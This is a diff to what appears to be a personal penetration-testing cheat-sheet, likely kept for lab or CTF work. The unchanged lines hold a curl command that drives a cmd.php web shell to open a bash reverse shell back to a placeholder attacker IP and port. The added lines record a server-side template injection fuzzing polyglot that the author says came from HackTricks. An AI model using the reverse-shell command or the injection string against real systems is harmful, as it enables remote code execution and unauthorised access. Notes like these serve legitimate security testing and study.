@@ -11,3 +11,10 @@ and need a revshell.
 ```bash
 curl http://10.10.10.101/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"
 ```
+
+### SSTI Fuzzing string
+
+stolen from hacktricks bc i use it often and it takes me forever to find it each time
+```
+${{<%[%'"}}%\
+```
